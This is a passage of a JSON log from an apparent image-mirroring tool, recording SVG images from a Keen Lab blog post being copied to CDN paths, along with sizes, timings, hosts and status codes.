01:46:23","host":"us-52*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.2 KB","destSize":"24.2 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_9.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn90@2020_4/2020/10/18/17-46-26-871_547cfb73d31fc4df.svg","sourceBytes":26321,"destBytes":26321,"feedId":22909,"totalSpendMs":4297,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:23","host":"europe64*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"25.7 KB","destSize":"25.7 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_7.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn6@2020_1/2020/10/18/17-46-27-251_bcebaa73812b1c42.svg","sourceBytes":24956,"destBytes":24956,"feedId":22909,"totalSpendMs":4579,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:23","host":"us-005*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.4 KB","destSize":"24.4 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_2.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn26@2020_1/2020/10/18/17-46-27-416_ddff230e6fbb7e76.svg","sourceBytes":25029,"destBytes":25029,"feedId":22909,"totalSpendMs":4746,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:23","host":"us-009*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.4 KB","destSize":"24.4 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_6.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn9@2020_1/2020/10/18/17-46-27-447_9f53667a68b9765f.svg","sourceBytes":24237,"destBytes":24237,"feedId":22909,"totalSpendMs":4944,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:23","host":"europe68*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.7 KB","destSize":"23.7 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_10.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn2@2020_2/2020/10/18/17-46-27-795_0d7635aff112fd2a.svg","sourceBytes":25034,"destBytes":25034,"feedId":22909,"totalSpendMs":5114,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:23","host":"us-017*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.4 KB","destSize":"24.4 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_4.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn18@2020_5/2020/10/18/17-46-27-832_7fa609b53ad9940b.svg","sourceBytes":24239,"destBytes":24239,"feedId":22909,"totalSpendMs":5157,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:23","host":"us-034*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.7 KB","destSize":"23.7 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_3.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn21@2020_5/2020/10/18/17-46-27-921_31496d6c6bc3d575.svg","sourceBytes":24792,"destBytes":24792,"feedId":22909,"totalSpendMs":5222,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:23","host":"us-021*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"24.2 KB","destSize":"24.2 KB","compressRate":"100%"},{"code":1,"isDone":false,"source":"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_11.svg","sourceStatusCode":200,"destWidth":0,"destHeight":0,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn98@2020_3/2020/10/18/17-46-28-978_5d51455dfba04fa5.svg","sourceBytes":24394,"destBytes":24394,"feedId":22909,"totalSpendMs":6342,"convertSpendMs":0,"createdTime":"2020-10-19 01:46:23","host":"us-029*","referer":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","linkMd5ListStr":"b053f98b0900f3e9efc44e1aa86f6b4f","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"23.8 KB","destSize":"23.8 KB","compressRate":"100%"}],"successGithubMap":{"myreaderx8":1,"myreaderx25":1,"myreaderx7":1,"myreaderx16":1,"myreaderx27":1,"myreaderx10":1,"myreaderx21":1,"myreaderx4":1,"myreaderx2":1,"myreaderx29":1,"myreaderx19":1},"failGithubMap":{"myreaderx14":1}}